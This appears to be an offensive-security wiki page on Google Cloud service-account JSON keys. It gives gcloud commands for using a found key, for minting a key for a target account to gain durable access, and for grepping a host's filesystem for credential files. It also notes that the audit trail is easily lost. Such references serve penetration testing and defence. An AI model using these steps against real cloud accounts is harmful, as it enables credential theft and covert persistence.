---
title: "Service account keys: exported JSON keys and creating new ones"
description: "Finding and using exported service-account JSON key files, and creating new keys for durable access."
keywords:
  - service account key
  - JSON key
  - key file
  - gcloud auth
  - persistence
  - credential
---

# Service account keys

A service-account **JSON key** is a long-lived, offline credential: whoever holds the file authenticates as that account from anywhere, with no token expiry. Keys leak into source, CI config, developer laptops, and storage buckets, and `iam.serviceAccountKeys.create` lets you mint a fresh one for any account you can reach, which is both an escalation and a durable backdoor.

## Using a found key

```bash
gcloud auth activate-service-account --key-file=key.json
gcloud auth print-access-token          # now acting as the service account
```

## Creating a key for a target account

```bash
# needs iam.serviceAccountKeys.create on the target account
gcloud iam service-accounts keys create loot.json \
  --iam-account=<target>@<project>.iam.gserviceaccount.com
gcloud auth activate-service-account --key-file=loot.json
```

## Finding keys on a host

```bash
grep -rl '"type": "service_account"' / 2>/dev/null
ls ~/.config/gcloud/   # legacy; ADC and key refs live here too
```

## Exploitation notes

- A created key is the quietest durable persistence on GCP: it survives password resets and token revocation, and key creation is a single audit event easily lost in noise.
- Keys do not carry scopes, so a key for a broadly-roled account is full access, unlike a scoped metadata token.
- Prefer [impersonation](../identity/service-account-impersonation/index.md) over key creation when you only need short-term access and want to leave less behind.

## Tools

- **gcloud** (`iam service-accounts keys create`, `auth activate-service-account`).
- **TruffleHog** / **gitleaks** to find leaked keys in source and history.

## References

- [Google: managing service account keys](https://cloud.google.com/iam/docs/keys-create-delete)
- [Rhino Security Labs: GCP privilege escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
